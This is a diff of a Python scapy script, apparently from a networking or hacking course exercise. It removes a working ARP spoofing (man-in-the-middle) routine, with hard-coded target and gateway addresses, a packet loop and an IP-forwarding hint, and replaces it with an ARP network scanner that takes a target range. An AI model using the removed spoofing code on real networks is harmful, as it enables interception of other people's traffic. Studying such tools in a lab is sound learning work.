@@ -1,58 +1,47 @@
 import scapy.all as scapy
-import time as time
+import optparse
 
+#you can do this whole program with scapy.ping(ip)
+#def scan(ip):
+  #scapy.arping(ip)
 
-##scapy.ls(scapy.ARP) will tell you the list of all arguments you can set in scapy.ARP
-##op = 2 is to indicate that this is an arp response. op = 1 indicates a arp request
-## pdst is the target IP
-## hwdst is the target mac
-## psrc is the source (or the router we are immitating)
+#scan("ip/24")
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return (answered_list[0][1].hwsrc)
+def get_arg():
+  parser=optparse.OptionParser()
+  parser.add_option("-t", "--target", dest="target", help="target IP/IP Range")
+  (options, arguments) = parser.parse_args()
+  if not options.target:
+    print("Please specify target ip range, use --help for more info")
+  return options
 
-#srp returns two lists from the arp broadcast, answered and unanswered.
-#we are returning the lowest value in the router subnet range, which is the router.
+def scan(ip):
+  #target IP
+  arp_request = scapy.ARP(pdst=ip)
+  #broadcast mac destination
+  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+  #put both ip and mac destinaton into one variable
+  arp_request_broadcast = broadcast/arp_request
+  #send the paceket. srp allows us to send packets with Ether and receive response in variable
+  #the srp will return two lists - 1. answered packet 2. unanswered packet
+  #using [0] at the end of the line will indicate capturing the answered packet
+  answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+  client_list=[]
+  for element in answered_list:
+    #scapy.srp answered returns two additonal lists (srp is a nested list) for each ip in the range
+    #  - the packet that generated the answer and the answer
+    #we are interested in retriving the answer, so we are printing the
+    #psrc which is answered ip and hwsrc which is the associated mac
+        client_dict={"ip":element[1].psrc, "mac" : element[1].hwsrc}
+        client_list.append(client_dict)
+  return client_list
 
+def print_result(result_list):
+  print("IP\t\t\tMAC Address\n------------------------------------------------")
+  for element in result_list:
+    print(element["ip"] + "\t\t\t" + element["mac"])
 
-
-
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op = 2, pdst = target_ip , hwdst = target_mac , psrc =spoof_ip)
-    #verbose=false will mute the packet sent indication during execution
-    scapy.send(packet, verbose=False)
-
-def restore (destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc= source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
-
-target_ip = "10.0.2.4"
-gateway_ip = "10.0.2.1"
-
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-
-        #\r stays print from start of line and overwrite previous print
-        #end = specifies what character to add to end of print statement which we left blank
-        print("\r[+] Packets sent : " + str(sent_packets_count), end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print ("\n[-] Detected CTRL + C .... Resetting ARP tables.")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
-
-#dont for get to type echo 1 > /proc/sys/net/ipv4/ip_foward to enable packet forwarding
-#print(packet.show())
-#print(packet.summary())
-
+options=get_arg()
+if options.target:
+  scan_result=scan(options.target)
+print_result(scan_result)
